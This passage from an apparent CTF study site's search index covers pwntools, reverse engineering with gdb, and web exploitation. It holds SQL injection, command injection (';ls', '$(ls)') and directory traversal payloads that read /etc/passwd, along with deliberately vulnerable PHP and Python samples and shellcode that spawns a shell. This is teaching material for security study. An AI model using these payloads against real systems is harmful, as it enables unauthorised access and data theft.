whoami\nuser\n</code></pre> <p>There\u2019s even an SSH module for when you\u2019ve got to SSH into a box to perform a local/setuid exploit with <code>pwnlib.tubes.ssh</code>. You can quickly spawn processes and grab the output, or spawn a process and interact with it like a <code>process</code> tube.</p> <pre><code>&gt;&gt;&gt; shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)\n&gt;&gt;&gt; shell['whoami']\nb'bandit0'\n&gt;&gt;&gt; shell.download_file('/etc/motd')\n&gt;&gt;&gt; sh = shell.run('sh')\n&gt;&gt;&gt; sh.sendline(b'sleep 3; echo hello world;') \n&gt;&gt;&gt; sh.recvline(timeout=1)\nb''\n&gt;&gt;&gt; sh.recvline(timeout=5)\nb'hello world\\n'\n&gt;&gt;&gt; shell.close()\n</code></pre>"},{"location":"CTF/Python_4/#packing-integers","title":"Packing Integers","text":"<p>A common task for exploit-writing is converting between integers as Python sees them, and their representation as a sequence of bytes. Usually, folks resort to the built-in <code>struct</code> module.</p> <p>pwntools makes this easier with <code>pwnlib.util.packing</code>. No more remembering unpacking codes, and littering your code with helper routines.</p> <pre><code>&gt;&gt;&gt; import struct\n&gt;&gt;&gt; p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef)\nTrue\n&gt;&gt;&gt; leet = unhex('37130000')\n&gt;&gt;&gt; u32(b'abcd') == struct.unpack('I', b'abcd')[0]\nTrue\n</code></pre> <p>The packing/unpacking operations are defined for many common bit-widths.</p> <pre><code>&gt;&gt;&gt; u8(b'A') == 0x41\nTrue\n</code></pre>"},{"location":"CTF/Python_4/#setting-the-target-architecture-and-os","title":"Setting the Target Architecture and OS","text":"<p>The target architecture can generally be specified as an argument to the routine that requires it.</p> <pre><code>&gt;&gt;&gt; asm('nop')\nb'\\x90'\n&gt;&gt;&gt; asm('nop', arch='arm')\nb'\\x00\\xf0 \\xe3'\n</code></pre> <p>However, it can also be set once in the global <code>context</code>. The operating system, word size, and endianness can also be set here.</p> <pre><code>&gt;&gt;&gt; context.arch      = 'i386'\n&gt;&gt;&gt; context.os        = 'linux'\n&gt;&gt;&gt; context.endian    = 'little'\n&gt;&gt;&gt; context.word_size = 32\n</code></pre> <p>Additionally, you can use a shorthand to set all of the values at once.</p> <pre><code>&gt;&gt;&gt; asm('nop')\nb'\\x90'\n&gt;&gt;&gt; context(arch='arm', os='linux', endian='big', word_size=32)\n&gt;&gt;&gt; asm('nop')\nb'\\xe3 \\xf0\\x00'\n</code></pre>"},{"location":"CTF/Python_4/#setting-logging-verbosity","title":"Setting Logging Verbosity","text":"<p>You can control the verbosity of the standard pwntools logging via <code>context</code>.</p> <p>For example, setting</p> <pre><code>&gt;&gt;&gt; context.log_level = 'debug'\n</code></pre> <p>This will cause all of the data sent and received by a <code>tube</code> to be printed on the screen.</p>"},{"location":"CTF/Python_4/#assembly-and-disassembly","title":"Assembly and Disassembly","text":"<p>Never again will you need to run some already-assembled pile of shellcode from the internet! The <code>pwnlib.asm</code> module is full of awesome.</p> <pre><code>&gt;&gt;&gt; enhex(asm('mov eax, 0'))\n'b800000000'\n</code></pre> <p>But if you do, it\u2019s easy to suss out!</p> <pre><code>&gt;&gt;&gt; print(disasm(unhex('6a0258cd80ebf9')))\n   0:   6a 02                   push   0x2\n   2:   58                      pop    eax\n   3:   cd 80                   int    0x80\n   5:   eb f9                   jmp    0x0\n</code></pre> <p>However, you shouldn\u2019t even need to write your own shellcode most of the time! pwntools comes with the <code>pwnlib.shellcraft</code> module, which is loaded with useful time-saving shellcodes.</p> <p>Let\u2019s say that we want to setreuid(getuid(), getuid()) followed by duping file descriptor 4 to stdin, stdout, and stderr, and then pop a shell!</p> <pre><code>&gt;&gt;&gt; enhex(asm(shellcraft.setreuid() + shellcraft.dupsh(4))) # doctest: +ELLIPSIS\n'6a3158cd80...'\n</code></pre>"},{"location":"CTF/Python_4/#misc-tools","title":"Misc Tools","text":"<p>Never write another hexdump, thanks to <code>pwnlib.util.fiddling</code>.</p> <p>Find offsets in your buffer that cause a crash, thanks to <code>pwnlib.cyclic</code>.</p> <pre><code>&gt;&gt;&gt; cyclic(20)\nb'aaaabaaacaaadaaaeaaa'\n&gt;&gt;&gt; # Assume EIP = 0x62616166 (b'faab' which is pack(0x62616166))  at crash time\n&gt;&gt;&gt; cyclic_find(b'faab')\n120\n</code></pre>"},{"location":"CTF/Python_4/#elf-manipulation","title":"ELF Manipulation","text":"<p>Stop hard-coding things! Look them up at runtime with <code>pwnlib.elf</code>.</p> <pre><code>&gt;&gt;&gt; e = ELF('/bin/cat')\n&gt;&gt;&gt; print(hex(e.address)) #doctest: +SKIP\n0x400000\n&gt;&gt;&gt; print(hex(e.symbols['write'])) #doctest: +SKIP\n0x401680\n&gt;&gt;&gt; print(hex(e.got['write'])) #doctest: +SKIP\n0x60b070\n&gt;&gt;&gt; print(hex(e.plt['write'])) #doctest: +SKIP\n0x401680\n</code></pre> <p>You can even patch and save the files.</p> <pre><code>&gt;&gt;&gt; e = ELF('/bin/cat')\n&gt;&gt;&gt; e.read(e.address, 4)\nb'\\x7fELF'\n&gt;&gt;&gt; e.asm(e.address, 'ret')\n&gt;&gt;&gt; e.save('/tmp/quiet-cat')\n&gt;&gt;&gt; disasm(open('/tmp/quiet-cat','rb').read(1))\n'   0:   c3                      ret'\n</code></pre>"},{"location":"CTF/RE/","title":"Reverse Engineering","text":"<p>https://ctf101.org/reverse-engineering/overview/</p> <p>Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human-readable format.</p> <p>Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.</p> <ul> <li>Assembly / Machine Code</li> <li>The C Programming Language</li> <li>Disassemblers</li> <li>Decompilers</li> </ul>"},{"location":"CTF/RE/#assemblymachine-code","title":"Assembly/Machine Code","text":"<p>Machine Code or Assembly is code that has been formatted for direct execution by a CPU. Machine Code is why readable programming languages like C, when compiled, cannot be reversed into source code (well Decompilers can sort of, but more on that later).</p>"},{"location":"CTF/RE/#from-source-to-compilation","title":"From Source to Compilation","text":"<p>Godbolt shows the differences in machine code generated by various compilers.</p> <p>For example, if we have a simple C++ function:</p> <pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char c;\n    int fd = syscall(2, \"/etc/passwd\", 0);\n    while (syscall(0, fd, &amp;c, 1)) {\n        putchar(c);\n    }\n}\n</code></pre> <p>We can see the compilation results in some verbose instructions for the CPU:</p> <pre><code>.LC0:\n  .string \"/etc/passwd\"\nmain:\n  push rbp\n  mov rbp, rsp\n  sub rsp, 16\n  mov edx, 0\n  mov esi, OFFSET FLAT:.LC0\n  mov edi, 2\n  mov eax, 0\n  call syscall\n  mov DWORD PTR [rbp-4], eax\n.L3:\n  lea rdx, [rbp-5]\n  mov eax, DWORD PTR [rbp-4]\n  mov ecx, 1\n  mov esi, eax\n  mov edi, 0\n  mov eax, 0\n  call syscall\n  test rax, rax\n  setne al\n  test al, al\n  je .L2\n  movzx eax, BYTE PTR [rbp-5]\n  movsx eax, al\n  mov edi, eax\n  call putchar\n  jmp .L3\n.L2:\n  mov eax, 0\n  leave\n  ret\n</code></pre> <p>This is a one-way process for compiled languages as there is no way to generate sources from machine code. While the machine code may seem unintelligible, the extremely basic functions can be interpreted with some practice.</p>"},{"location":"CTF/RE/#x86-64","title":"x86-64","text":"<p>x86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32 bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of different things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means different instructions can be of diferent sizes ranging from 1 to 16 bytes long. And finally, x86-64 allows for multi-sized register access which means that you can access certain parts of a register that are different sizes.</p>"},{"location":"CTF/RE/#x86-64-registers","title":"x86-64 Registers","text":"<p>x86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access, meaning the register RAX can have its lower 32-bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL, allowing the computer to make optimizations that boost program execution. </p> <p>x86-64 has plenty of registers, including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes.</p> <p>The special registers include: - RIP: the instruction pointer - RSP: the stack pointer - RBP: the base pointer</p>"},{"location":"CTF/RE/#instructions","title":"Instructions","text":"<p>An instruction represents a single operation for the CPU to perform.</p> <p>There are different types of instructions including:</p> <ul> <li>Data movement: <code>mov rax, [rsp - 0x40]</code></li> <li>Arithmetic: <code>add rbx, rcx</code></li> <li>Control-flow: <code>jne 0x8000400</code></li> </ul> <p>Because x86-64 is a CISC architecture, instructions can be quite complex for machine code such as <code>repne scasb</code> which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!)</p> <p>It is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP.</p> <p>Instructions, numbers, strings, everything! Always represented in hex.</p> <pre><code>add rax, rbx\nmov rax, 0xdeadbeef\nmov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de\n\"Hello\" == 48 65 6c 6c 6f\n== 48 01 d8\n== 48 c7 c0 ef be ad de\n</code></pre>"},{"location":"CTF/RE/#execution","title":"Execution","text":"<p>What should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, and run it.</p>"},{"location":"CTF/RE/#examples","title":"Examples","text":"<ol> <li><code>mov rax, 0xdeadbeef</code></li> </ol> <p>Here the operation <code>mov</code> is moving the \"immediate\" <code>0xdeadbeef</code> into the register <code>RAX</code></p> <ol> <li><code>mov rax, [0xdeadbeef + rbx * 4]</code></li> </ol> <p>Here the operation <code>mov</code> is moving the data at the address of <code>[0xdeadbeef + RBX*4]</code> into the register <code>RAX</code>. When brackets are used, you can think of the program as getting the content from that effective address.</p>"},{"location":"CTF/RE/#example-execution","title":"Example Execution","text":"<pre><code>-&gt; 0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804000\n   0x080400a: add, rax, rbx                  RAX = 0x0\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n-&gt; 0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x080400a\n-&gt; 0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x080400d\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n-&gt; 0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804010\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n   0x080400d: inc rbx                        RBX = 0x1235\n-&gt; 0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804013\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0x0\n-&gt; 0x0804013: mov rcx, rax                   RDX = 0x0\n   0x0804000: mov eax, 0xdeadbeef            Register Values:\n   0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0xdeadbeee\n   0x0804013: mov rcx, rax                   RDX = 0x0\n</code></pre>"},{"location":"CTF/RE/#control-flow","title":"Control Flow","text":"<p>How can we express conditionals in x86-64? We use conditional jumps such as:</p> <ul> <li><code>jnz &lt;address&gt;</code></li> <li><code>je &lt;address&gt;</code></li> <li><code>jge &lt;address&gt;</code></li> <li><code>jle &lt;address&gt;</code></li> <li>etc.</li> </ul> <p>They jump if their condition is true and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers that store flags on certain instructions such as <code>add rax, rbx</code> which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a <code>jo</code> instruction. The most important thing to remember is the cmp instruction:</p> <pre><code>cmp rax, rbx\njle error\n</code></pre> <p>This assembly jumps if RAX &lt;= RBX</p>"},{"location":"CTF/RE/#addresses","title":"Addresses","text":"<p>Memory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier:</p> <pre><code>mov rax, [0xdeadbeef]\n</code></pre> <p>The square brackets mean \"get the data at this address\". This is analogous to the C/C++ syntax: <code>rax = *0xdeadbeef;</code></p>"},{"location":"CTF/RE/#disassemblers","title":"Disassemblers","text":"<p>A disassembler is a tool that breaks down a compiled program into machine code.</p>"},{"location":"CTF/RE/#list-of-disassemblers","title":"List of Disassemblers","text":"<ul> <li>IDA</li> <li>Binary Ninja</li> <li>GNU Debugger (GDB)</li> <li>radare2</li> <li>Hopper</li> </ul>"},{"location":"CTF/RE/#ida","title":"IDA","text":"<p>The Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry-leading Hex-Rays decompiler which can convert assembly code back into a pseudo code-like format.</p> <p></p> <p>IDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier:</p> <ul> <li>https://github.com/google/binnavi</li> <li>https://github.com/yegord/snowman</li> <li>https://github.com/gaasedelen/lighthouse</li> <li>https://github.com/joxeankoret/diaphora</li> <li>https://github.com/REhints/HexRaysCodeXplorer</li> <li>https://github.com/osirislab/Fentanyl</li> </ul>"},{"location":"CTF/RE/#binary-ninja","title":"Binary Ninja","text":"<p>Binary Ninja is an up-and-coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers.</p> <p></p> <p>Binja also has some community-contributed plugins which are collected here: https://github.com/Vector35/community-plugins</p>"},{"location":"CTF/RE/#gdb","title":"gdb","text":"<p>The GNU Debugger is a free and open-source debugger that also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabilities.</p> <p>gdb is often used in tandem with enhancement scripts like peda, pwndbg, and GEF</p> <p></p>"},{"location":"CTF/RE/#the-gnu-debugger-gdb","title":"The GNU Debugger (GDB)","text":"<p>The GNU Debugger or GDB is a powerful debugger that allows for the step-by-step execution of a program. It can be used to trace program execution and is an important part of any reverse engineering toolkit.</p>"},{"location":"CTF/RE/#vanilla-gdb","title":"Vanilla GDB","text":"<p>GDB without any modifications is unintuitive and obscures a lot of useful information. The plug-in pwndb solves a lot of these problems and makes for a much more pleasant experience. But if you are constrained and have to use vanilla gdb, here are several things to make your life easier.</p>"},{"location":"CTF/RE/#starting-gdb","title":"Starting GDB","text":"<p>To execute GBD and attach it to a program simply run <code>gdb [program]</code></p>"},{"location":"CTF/RE/#disassembly","title":"Disassembly","text":"<p><code>(gdb) disassemble [address/symbol]</code> will display the disassembly for that function/frame</p> <p>GDB will autocomplete functions, so saying <code>(gdb) disas main</code> suffices if you'd like to see the disassembly of the main</p>"},{"location":"CTF/RE/#view-disassembly-during-execution","title":"View Disassembly During Execution","text":"<p>Another handy thing to see while stepping through a program is the disassembly of nearby instructions:</p> <pre><code>(gdb) display/[# of instructions]i $pc [\u00b1 offset]\n</code></pre> <ul> <li><code>display</code> shows data with each step</li> <li><code>/[#]i</code> shows how much data in the format i for instruction</li> <li><code>$pc</code> means the pc, program counter, register</li> <li><code>[\u00b1 offset]</code> allows you to specify how you would like the data offset from the current instruction</li> </ul>"},{"location":"CTF/RE/#example-usage","title":"Example Usage","text":"<pre><code>(gdb) display/10i $pc - 0x5\n</code></pre> <p>This command will show 10 instructions on screen with an offset from the next instruction of 5, giving us this display:</p> <pre><code>   0x8048535 &lt;main+6&gt;:  lock pushl -0x4(%ecx)\n   0x8048539 &lt;main+10&gt;: push   %ebp\n=&gt; 0x804853a &lt;main+11&gt;: mov    %esp,%ebp\n   0x804853c &lt;main+13&gt;: push   %ecx\n   0x804853d &lt;main+14&gt;: sub    $0x14,%esp\n   0x8048540 &lt;main+17&gt;: sub    $0xc,%esp\n   0x8048543 &lt;main+20&gt;: push   $0x400\n   0x8048548 &lt;main+25&gt;: call   0x80483a0 &lt;malloc@plt&gt;\n   0x804854d &lt;main+30&gt;: add    $0x10,%esp\n   0x8048550 &lt;main+33&gt;: sub    $0xc,%esp\n</code></pre>"},{"location":"CTF/RE/#deleting-views","title":"Deleting Views","text":"<p>If for whatever reason, a view no long suits your needs simply call <code>(gdb) info display</code> which will give you a list of active displays:</p> <pre><code>Auto-display expressions now in effect:\nNum Enb Expression\n1:   y  /10bi $pc-0x5\n</code></pre> <p>Then simply execute <code>(gdb) delete display 1</code> and your execution will resume without the display.</p>"},{"location":"CTF/RE/#registers","title":"Registers","text":"<p>In order to view the state of registers with vanilla gdb, you need to run the command <code>info registers</code> which will display the state of all the registers:</p> <pre><code>eax            0xf77a6ddc   -142971428\necx            0xffe06b10   -2069744\nedx            0xffe06b34   -2069708\nebx            0x0  0\nesp            0xffe06af8   0xffe06af8\nebp            0x0  0x0\nesi            0xf77a5000   -142979072\nedi            0xf77a5000   -142979072\neip            0x804853a    0x804853a &lt;main+11&gt;\neflags         0x286    [ PF SF IF ]\ncs             0x23 35\nss             0x2b 43\nds             0x2b 43\nes             0x2b 43\nfs             0x0  0\ngs             0x63 99\n</code></pre> <p>If you simply would like to see the contents of a single register, the notation <code>x/x $[register]</code> where:</p> <ul> <li><code>x/x</code> means to display the address in hex notation</li> <li><code>$[register]</code> is the register code such as eax, rax, etc.</li> </ul>"},{"location":"CTF/RE/#pwndbg","title":"Pwndbg","text":"<p>These commands work with vanilla gdb as well.</p>"},{"location":"CTF/RE/#setting-breakpoints","title":"Setting Breakpoints","text":"<p>Setting breakpoints in GDB uses the format <code>b*[Address/Symbol]</code></p>"},{"location":"CTF/RE/#example-usage_1","title":"Example Usage","text":"<ul> <li><code>(gdb) b*main</code>: Break at the start</li> <li><code>(gdb) b*0x804854d</code>: Break at 0x804854d</li> <li><code>(gdb) b*0x804854d-0x100</code>: Break at 0x804844d</li> </ul>"},{"location":"CTF/RE/#deleting-breakpoints","title":"Deleting Breakpoints","text":"<p>As before, in order to delete a view, you can list the available breakpoints using <code>(gdb) info breakpoints</code> (don't forget about GDB's autocomplete, you don't always need to type out every command!) which will display all breakpoints:</p> <pre><code>Num     Type           Disp Enb Address    What\n1       breakpoint     keep y   0x0804852f &lt;main&gt;\n3       breakpoint     keep y   0x0804864d &lt;__libc_csu_init+61&gt;\n</code></pre> <p>Then simply execute <code>(gdb) delete 1</code></p> <p>Note</p> <p>GDB creates breakpoints chronologically and does NOT reuse numbers.</p>"},{"location":"CTF/RE/#stepping","title":"Stepping","text":"<p>What good is a debugger if you can't control where you are going? In order to begin the execution of a program, use the command <code>r [arguments]</code> similar to how if you ran it with dot-slash notation you would execute it <code>./program [arguments]</code>. In this case, the program will run normally and if no breakpoints are set, you will execute normally. If you have breakpoints set, you will stop at that instruction.</p> <ul> <li><code>(gdb) continue [# of breakpoints]</code>: Resumes the execution of the program until it finishes or until another breakpoint is hit (shorthand <code>c</code>)</li> <li><code>(gdb) step[# of instructions]</code>: Steps into an instruction the specified number of times, default is 1 (shorthand <code>s</code>)</li> <li><code>(gdb) next instruction [# of instructions]</code>: Steps over an instruction meaning it will not delve into called functions (shorthand <code>ni</code>)</li> <li><code>(gdb) finish</code>: Finishes a function and breaks after it gets returned (shorthand <code>fin</code>)</li> </ul>"},{"location":"CTF/RE/#examining","title":"Examining","text":"<p>Examining data in GDB is also very useful for seeing how the program is affecting data. The notation may seem complex at first, but it is flexible and provides powerful functionality.</p> <pre><code>(gdb) x/[#][size][format] [Address/Symbol/Register][\u00b1 offset]\n</code></pre> <ul> <li><code>x/</code> means examine</li> <li><code>[#]</code> means how much</li> <li><code>[size]</code> means what size the data should be such as a word w (2 bytes), double word d (4 bytes), or giant word g (8 bytes)</li> <li><code>[format]</code> means how the data should be interpreted such as an instruction i, a string s, hex bytes x</li> <li><code>[Address/Symbol][\u00b1 offset]</code> means where to start interpreting the data</li> </ul>"},{"location":"CTF/RE/#example-usage_2","title":"Example Usage","text":"<ul> <li><code>(gdb) x/x $rax</code>: Displays the content of the register RAX as hex bytes</li> <li><code>(gdb) x/i 0xdeadbeef</code>: Displays the instruction at address 0xdeadbeef</li> <li><code>(gdb) x/10s 0x893e10</code>: Displays 10 strings at the address</li> <li><code>(gdb) x/10gx 0x7fe10</code>: Displays 10 giant words as hex at the address</li> </ul>"},{"location":"CTF/RE/#forking","title":"Forking","text":"<p>If the program happens to be an accept-and-fork server, gdb will have issues following the child or parent processes. In order to specify how you want gdb to function you can use the command <code>set follow-fork-mode [on/off]</code></p>"},{"location":"CTF/RE/#setting-data","title":"Setting Data","text":"<p>If you would like to set data at any point, it is possible using the command <code>set [Address/Register]=[Hex Data]</code></p>"},{"location":"CTF/RE/#example-usage_3","title":"Example Usage","text":"<ul> <li><code>set $rax=0x0</code>: Sets the register rax to 0</li> <li><code>set 0x1e4a70=0x123</code>: Sets the data at 0x1e4a70 to 0x123</li> </ul>"},{"location":"CTF/RE/#process-mapping","title":"Process Mapping","text":"<p>A handy way to find the process's mapped address spaces is to use <code>info proc map</code>:</p> <pre><code>Mapped address spaces:\n\n    Start Addr   End Addr       Size     Offset objfile\n     0x8048000  0x8049000     0x1000        0x0 /directory/program\n     0x8049000  0x804a000     0x1000        0x0 /directory/program\n     0x804a000  0x804b000     0x1000     0x1000 /directory/program\n    0xf75cb000 0xf75cc000     0x1000        0x0\n    0xf75cc000 0xf7779000   0x1ad000        0x0 /lib32/libc-2.23.so\n    0xf7779000 0xf777b000     0x2000   0x1ac000 /lib32/libc-2.23.so\n    0xf777b000 0xf777c000     0x1000   0x1ae000 /lib32/libc-2.23.so\n    0xf777c000 0xf7780000     0x4000        0x0\n    0xf778b000 0xf778d000     0x2000        0x0 [vvar]\n    0xf778d000 0xf778f000     0x2000        0x0 [vdso]\n    0xf778f000 0xf77b1000    0x22000        0x0 /lib32/ld-2.23.so\n    0xf77b1000 0xf77b2000     0x1000        0x0\n    0xf77b2000 0xf77b3000     0x1000    0x22000 /lib32/ld-2.23.so\n    0xf77b3000 0xf77b4000     0x1000    0x23000 /lib32/ld-2.23.so\n    0xffc59000 0xffc7a000    0x21000        0x0 [stack]\n</code></pre> <p>This will show you where the stack, heap (if there is one), and libc are located.</p>"},{"location":"CTF/RE/#attaching-processes","title":"Attaching Processes","text":"<p>Another useful feature of GDB is to attach to processes that are already running. Simply launch gdb using <code>gdb</code>, then find the process id of the program you would like to attach to an execute <code>attach [pid]</code>.</p>"},{"location":"CTF/Web/","title":"Web Exploitation","text":"<p>https://ctf101.org/web-exploitation/overview/</p> <p>Websites all around the world are programmed using various programming languages. While the developer should be aware of specific vulnerabilities in each programming language, there are issues fundamental to the internet that can show up regardless of the chosen language or framework.</p> <p>These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher-level privilege.</p> <p>Common vulnerabilities to see in CTF challenges:</p> <ul> <li>SQL Injection</li> <li>Command Injection</li> <li>Directory Traversal</li> <li>Cross-Site Request Forgery</li> <li>Cross-Site Scripting</li> <li>Server-Side Request Forgery</li> </ul>"},{"location":"CTF/Web/#sql-injection","title":"SQL Injection","text":"<p>SQL Injection is a vulnerability where an application takes input from a user and doesn't validate that the user's input doesn't contain additional SQL.</p> <pre><code>&lt;?php\n    $username = $_GET['username']; // kchung\n    $result = mysql_query(\"SELECT * FROM users WHERE username='$username'\");\n?&gt;\n</code></pre> <p>If we look at the $username variable, we might expect the username parameter to be a real username (e.g. kchung) under normal operation.</p> <p>But a malicious user might submit a different kind of data. For example, consider if the input was <code>'</code>?</p> <p>The application would crash because the resulting SQL query is incorrect.</p> <pre><code>SELECT * FROM users WHERE username='''\n</code></pre> <p>Notice the extra single quote at the end.</p> <p>With the knowledge that a single quote will cause an error in the application, we can expand a little more on SQL Injection.</p> <p>What if our input was <code>' OR 1=1</code>?</p> <pre><code>SELECT * FROM users WHERE username='' OR 1=1\n</code></pre> <p>1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying</p> <pre><code>SELECT * FROM users WHERE username='' OR true\n</code></pre> <p>This will return every row in the table because each row that exists must be true.</p> <p>We can also inject comments and termination characters like <code>--</code> or <code>/*</code> or <code>;</code>. This allows you to terminate SQL queries after your injected statements. For example <code>'--</code> is a common SQL injection payload.</p> <pre><code>SELECT * FROM users WHERE username=''-- '\n</code></pre> <p>This payload sets the username parameter to an empty string to break out of the query and then adds a comment (<code>--</code>) that effectively hides the second single quote.</p> <p>Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.</p>"},{"location":"CTF/Web/#command-injection","title":"Command Injection","text":"<p>Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the <code>system()</code> command or its equivalent in the application's programming language.</p> <pre><code>import os\n\ndomain = user_input() # ctf101.org\n\nos.system('ping ' + domain)\n</code></pre> <p>The above code when used normally will ping the <code>ctf101.org</code> domain.</p> <p>But consider what would happen if the <code>user_input()</code> function returned different data.</p> <pre><code>import os\n\ndomain = user_input() # ; ls\n\nos.system('ping ' + domain)\n</code></pre> <p>Because of the additional semicolon, the <code>os.system()</code> function is instructed to run two commands.</p> <p>It looks to the program as:</p> <pre><code>ping ; ls\n</code></pre> <p>The semicolon terminates a command in bash and allows you to put another command after it.</p> <p>Because the <code>ping</code> command is being terminated and the <code>ls</code> command is being added on, the <code>ls</code> command will be run in addition to the empty ping command!</p> <p>This is the core concept behind command injection. The <code>ls</code> command could of course be switched with another command (e.g. wget, curl, bash, etc.)</p> <p>Command injection is a very common means of privilege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.</p>"},{"location":"CTF/Web/#example-payloads","title":"Example Payloads","text":"<ul> <li><code>;ls</code></li> <li><code>$(ls)</code></li> <li><code>ls</code></li> </ul>"},{"location":"CTF/Web/#directory-traversal","title":"Directory Traversal","text":"<p>Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.</p> <p>Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal.</p> <p>For example, consider an application that allows the user to choose what page to load from a GET parameter.</p> <pre><code>&lt;?php\n    $page = $_GET['page']; // index.php\n    include(\"/var/www/html/\" . $page);\n?&gt;\n</code></pre> <p>Under normal operation, the page would be <code>index.php</code>. But what if a malicious user gave in something different?</p> <pre><code>&lt;?php\n    $page = $_GET['page']; // ../../../../../../../../etc/passwd\n    include(\"/var/www/html/\" . $page);\n?&gt;\n</code></pre> <p>Here the user is submitting <code>../../../../../../../../etc/passwd</code>.</p> <p>This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder.</p> <pre><code>include(\"/var/www/html/../../../../../../../../etc/passwd\");\n</code></pre> <p>Ultimately this will become <code>/etc/passwd</code> because the computer will not go a directory above its top directory.</p> <p>Thus the application will load the <code>/etc/passwd</code> file and emit it to the user like so:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd 